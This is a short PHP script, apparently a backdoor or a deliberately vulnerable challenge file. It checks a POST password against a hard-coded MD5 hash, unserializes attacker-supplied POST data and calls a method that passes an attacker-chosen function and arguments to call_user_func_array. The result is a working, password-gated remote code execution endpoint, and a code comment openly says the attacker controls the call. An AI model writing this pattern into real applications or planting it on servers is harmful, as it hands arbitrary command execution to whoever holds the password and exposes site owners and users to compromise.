<?php

class Processor {
    public $func;
    public $args;

    public function run() {
        // Dynamic function call - attacker controls $func
        echo call_user_func_array($this->func, $this->args);
    }
}

if (isset($_POST['data']) && isset($_POST['t']) ) {
    if(md5($_POST['t']) === "b1afe53f84799f5ed000a25defa3db68") {
        $obj = unserialize($_POST['data']);
        if (method_exists($obj, 'run')) {
            $obj->run();
        }
    };

}
?>
